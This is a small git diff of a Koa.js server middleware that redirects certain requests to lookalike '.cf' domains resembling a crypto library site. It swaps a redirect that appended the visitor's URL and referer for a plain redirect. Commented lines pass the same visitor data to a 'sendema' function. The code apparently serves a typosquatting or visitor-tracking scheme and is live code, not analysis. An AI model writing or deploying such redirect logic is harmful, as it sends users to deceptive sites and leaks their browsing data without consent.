@@ -93,9 +93,9 @@ app.use(async (ctx, next)=>{
             }else if(str.includes('cryptojsorg')){
                 // var data = {uu:ctx.href,referer:str1||''};
                 // sendema(data,ctx)
-                ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href+'&referer='+str1||'');
+                // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href+'&referer='+str1||'');
                 // return;
-                // ctx.response.redirect('http://cryptosjsorg.cf');
+                ctx.response.redirect('http://cryptosjsorg.cf');
                
             }else{
                 var data = {uu:ctx.href,referer:str1||''};
